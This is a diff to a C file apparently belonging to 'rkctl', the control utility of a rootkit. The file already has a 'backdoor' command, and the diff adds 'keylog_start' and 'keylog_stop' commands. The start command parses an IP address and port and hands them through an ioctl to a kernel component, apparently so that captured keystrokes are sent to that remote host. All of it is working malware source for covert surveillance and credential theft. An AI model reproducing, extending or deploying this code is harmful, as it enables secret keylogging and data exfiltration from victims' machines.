@@ -6,6 +6,7 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <string.h>
+#include <arpa/inet.h>
 
 int do_ioctl_request(const char *desc, unsigned int request, void *data) {
 
@@ -136,13 +137,44 @@ int do_backdoor(int argc, const char *argv[]) {
     return 0;
 }
 
+int do_start_key_logger(int argc, const char *argv[]) {
+
+    struct sockaddr_in addr;
+    char *endptr = NULL;
+
+    if (argc != 4) {
+        printf("[-] rkctl: wrong number of arguments\n");
+        return -1;
+    }
+
+    /*
+     * Parse port and ip
+     */
+
+    addr.sin_family = AF_INET;
+    errno = 0;
+    addr.sin_port = htons((unsigned short) strtol(argv[3], &endptr, 0));
+
+    if (errno != 0 || *endptr != 0) {
+        printf("[-] rkctl: do_start_key_logger() cannot parse port\n");
+        return -1;
+    }
+
+    if (!inet_pton(AF_INET, argv[2], &(addr.sin_addr))) {
+        printf("[-] rkctl: do_start_key_logger cannot parse ip\n");
+        return -1;
+    }
+
+    return do_ioctl_request("start_keylogger", RKCTL_START_KEY_LOGGER, (void *) &addr);
+}
+
 int main(int argc, const char *argv[]) {
 
-    char *endptr = NULL;
     const char *cmd;
 
     if (argc < 2) {
         printf("[-] rkctl: missing command\n");
+        return -1;
     }
 
     cmd = argv[1];
@@ -162,6 +194,14 @@ int main(int argc, const char *argv[]) {
     } else if (!strcmp(cmd, "backdoor")) {
 
         return do_backdoor(argc, argv);
+
+    } else if (!strcmp(cmd, "keylog_start")) {
+
+        return do_start_key_logger(argc, argv);
+
+    } else if (!strcmp(cmd, "keylog_stop")) {
+
+        return do_ioctl_request("stop_keylogger", RKCTL_STOP_KEY_LOGGER, NULL);
 
     } else {
         printf("[-] rkctl: command not supported\n");
